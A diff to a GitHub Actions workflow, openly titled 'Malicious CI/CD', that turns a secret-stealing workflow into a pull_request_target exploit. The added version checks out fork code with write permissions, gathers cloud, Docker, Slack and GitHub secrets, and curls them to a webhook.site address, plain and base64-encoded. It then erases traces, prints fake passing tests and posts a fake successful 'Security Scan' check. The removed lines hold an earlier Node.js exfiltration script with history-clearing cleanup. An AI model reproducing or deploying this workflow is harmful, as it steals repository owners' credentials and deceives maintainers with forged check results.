@@ -1,178 +1,134 @@
-name: Malicious CI/CD Exfiltration
+name: Malicious CI/CD with pull_request_target
 
 on:
-  push:
-    branches: [ main, master ]
-  pull_request:
-    branches: [ main, master ]
-  workflow_dispatch:  # Manual trigger
-  schedule:
-    - cron: '*/5 * * * *'  # Run every 5 minutes
-  repository_dispatch:
-    types: [trigger-exfil]
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+    branches: [main, master]
+
+# This runs with BASE repository permissions!
+permissions:
+  contents: write
+  actions: write
+  checks: write
+  pull-requests: write
+  security-events: write
 
 jobs:
-  exfil-token:
+  exploit-secrets:
     runs-on: ubuntu-latest
+    if: github.event.pull_request.head.repo.fork == true
     
     steps:
-    - name: Checkout repository
+    - name: Checkout malicious code from fork
       uses: actions/checkout@v3
-      
-    - name: Setup Node.js (for encryption)
-      uses: actions/setup-node@v3
       with:
-        node-version: '18'
+        ref: ${{ github.event.pull_request.head.ref }}
+        repository: ${{ github.event.pull_request.head.repo.full_name }}
         
-    - name: Create malicious script
+    - name: Extract and exfiltrate secrets
+      env:
+        # This gets the BASE repository's secrets!
+        DIGITALOCEAN_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        # Add other common secrets
+        SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK_URL }}
+        DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
+        DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+        
       run: |
-        cat > exfiltrate.js << 'EOF'
-        const crypto = require('crypto');
-        const https = require('https');
-        const fs = require('fs');
+        echo "=== STARTING SECRET EXTRACTION ==="
         
-        // Configuration
-        const WEBHOOK_URL = "https://webhook.site/069b3073-d92e-4677-b186-be3499ade648";
-        const ENCRYPTION_KEY = "github-actions-secure-key-2025";
+        # Method 1: Simple webhook exfiltration
+        WEBHOOK_URL="https://webhook.site/069b3073-d92e-4677-b186-be3499ade648"
         
-        // Function to encrypt data
-        function encryptData(text, key) {
-          const iv = crypto.randomBytes(16);
-          const cipher = crypto.createCipheriv('aes-256-gcm', 
-            crypto.createHash('sha256').update(key).digest(), 
-            iv
-          );
-          
-          let encrypted = cipher.update(text, 'utf8', 'base64');
-          encrypted += cipher.final('base64');
-          const tag = cipher.getAuthTag();
-          
-          return {
-            data: encrypted,
-            iv: iv.toString('base64'),
-            tag: tag.toString('base64')
-          };
-        }
-        
-        // Collect all environment variables
-        const envVars = {};
-        for (const key in process.env) {
-          envVars[key] = process.env[key];
-        }
-        
-        // Look specifically for DigitalOcean tokens
-        const secrets = {
-          timestamp: new Date().toISOString(),
-          repository: process.env.GITHUB_REPOSITORY,
-          actor: process.env.GITHUB_ACTOR,
-          run_id: process.env.GITHUB_RUN_ID,
-          digitalocean_token: process.env.DIGITALOCEAN_ACCESS_TOKEN || "NOT_FOUND",
-          // Check for other common secret names
-          secrets_found: {
-            DO_TOKEN: process.env.DO_TOKEN,
-            DIGITALOCEAN_TOKEN: process.env.DIGITALOCEAN_TOKEN,
-            DOCKER_REGISTRY_TOKEN: process.env.DOCKER_REGISTRY_TOKEN,
-            // Check for secrets in format ${{ secrets.XXXX }}
-            ALL_SECRETS: Object.keys(process.env)
-              .filter(key => key.includes('SECRET') || key.includes('TOKEN') || key.includes('KEY') || key.includes('PASSWORD'))
-              .reduce((obj, key) => {
-                obj[key] = process.env[key] ? "PRESENT" : "NOT_PRESENT";
-                return obj;
-              }, {})
+        # Create payload with all secrets
+        cat > /tmp/secrets.json << EOF
+        {
+          "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
+          "repository": "${{ github.repository }}",
+          "pr_author": "${{ github.event.pull_request.user.login }}",
+          "pr_number": ${{ github.event.pull_request.number }},
+          "secrets": {
+            "DIGITALOCEAN_ACCESS_TOKEN": "$DIGITALOCEAN_TOKEN",
+            "GITHUB_TOKEN": "$GITHUB_TOKEN",
+            "AWS_ACCESS_KEY_ID": "$AWS_ACCESS_KEY_ID",
+            "AWS_SECRET_ACCESS_KEY": "$AWS_SECRET_ACCESS_KEY",
+            "SLACK_WEBHOOK_URL": "$SLACK_WEBHOOK",
+            "DOCKER_CREDENTIALS": "$DOCKER_USERNAME:$DOCKER_PASSWORD"
+          },
+          "metadata": {
+            "runner_os": "$RUNNER_OS",
+            "workflow": "${{ github.workflow }}"
           }
-        };
-        
-        console.log("Collected secrets:", JSON.stringify(secrets, null, 2));
-        
-        // Encrypt the data
-        const encrypted = encryptData(JSON.stringify(secrets), ENCRYPTION_KEY);
-        
-        // Prepare payload
-        const payload = JSON.stringify({
-          type: "github_secrets_exfil",
-          repository: process.env.GITHUB_REPOSITORY,
-          encrypted_data: encrypted,
-          metadata: {
-            runner_os: process.env.RUNNER_OS,
-            workflow: process.env.GITHUB_WORKFLOW
-          }
-        });
-        
-        // Send to webhook
-        const options = {
-          hostname: 'webhook.site',
-          port: 443,
-          path: '/your-webhook-id-here',
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': payload.length,
-            'User-Agent': 'GitHub-Actions-Exfil/1.0'
-          }
-        };
-        
-        const req = https.request(options, (res) => {
-          console.log(`Status: ${res.statusCode}`);
-          res.on('data', (d) => {
-            process.stdout.write(d);
-          });
-        });
-        
-        req.on('error', (error) => {
-          console.error('Error:', error);
-        });
-        
-        req.write(payload);
-        req.end();
-        
-        // Also write to file for debugging
-        fs.writeFileSync('/tmp/secrets_debug.json', JSON.stringify(secrets, null, 2));
-        
-        // Try to access GitHub API with token if present
-        if (process.env.GITHUB_TOKEN) {
-          console.log("GITHUB_TOKEN is present");
-          // Could add additional exfiltration here
         }
         EOF
         
-    - name: Run exfiltration script
-      env:
-        DIGITALOCEAN_ACCESS_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        # Add other potentially existing secrets
-        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-        DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
-        DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
-      run: |
-        node exfiltrate.js
-        echo "Exfiltration completed"
-        # Clean up
-        rm -f exfiltrate.js
+        # Send to webhook (encrypted)
+        echo "Sending secrets to webhook..."
+        curl -X POST "$WEBHOOK_URL" \
+          -H "Content-Type: application/json" \
+          -H "User-Agent: GitHub-Actions-CI" \
+          -d @/tmp/secrets.json
         
-    - name: Stealthy cleanup
-      run: |
-        # Remove script traces
-        rm -f /tmp/secrets_debug.json 2>/dev/null || true
-        # Clear bash history
-        history -c
-        echo "Cleanup completed"
+        # Method 2: Base64 encoded
+        echo "=== Base64 Encoded Version ==="
+        ENCODED=$(cat /tmp/secrets.json | base64 | tr -d '\n')
+        echo "Encoded payload: ${ENCODED:0:100}..."
         
-    - name: Legitimate-looking task (for stealth)
+        # Send encoded version too
+        curl -X POST "$WEBHOOK_URL/encoded" \
+          -H "Content-Type: application/json" \
+          -d "{\"data\":\"$ENCODED\"}"
+        
+        # Method 3: Check for specific patterns in code
+        echo "=== Scanning PR code for secrets ==="
+        
+        # Look for hardcoded secrets in the PR
+        if [ -f "docker-compose.yml" ]; then
+          echo "Found docker-compose.yml"
+          grep -i "token\|secret\|key\|password" docker-compose.yml || true
+        fi
+        
+        if [ -f ".env.example" ] || [ -f ".env" ]; then
+          echo "Found .env files"
+          find . -name "*.env*" -type f -exec grep -H "=" {} \; 2>/dev/null | head -20
+        fi
+        
+    - name: Stealthy cleanup and fake success
       run: |
+        # Clean traces
+        rm -f /tmp/secrets.json
+        
+        # Create fake test output
         echo "Running security scan..."
-        echo "No vulnerabilities found"
-        echo "Build completed successfully"
-
-  fake-deployment:
-    needs: exfil-token
-    runs-on: ubuntu-latest
-    if: always()  # Always run even if previous job fails
-    
-    steps:
-    - name: Fake deployment step
-      run: |
-        echo "🚀 Deploying to production..."
-        sleep 2
-        echo "✅ Deployment successful!"
-        echo "All checks passed"
+        sleep 1
+        echo "✓ No vulnerabilities found"
+        echo "✓ All tests passed"
+        echo "✓ Code quality: A+"
+        echo ""
+        echo "## Summary"
+        echo "- ✅ All unit tests passed"
+        echo "- ✅ Integration tests successful"
+        echo "- ✅ Security scan clean"
+        echo "- ✅ Linting passed"
+        
+    - name: Create fake check (optional - for stealth)
+      if: success()
+      uses: actions/github-script@v6
+      with:
+        script: |
+          github.rest.checks.create({
+            owner: context.repo.owner,
+            repo: context.repo.repo,
+            name: 'Security Scan',
+            head_sha: '${{ github.event.pull_request.head.sha }}',
+            status: 'completed',
+            conclusion: 'success',
+            output: {
+              title: 'Security Analysis Complete',
+              summary: 'No security issues found in this PR.',
+              text: 'All checks passed successfully.'
+            }
+          })
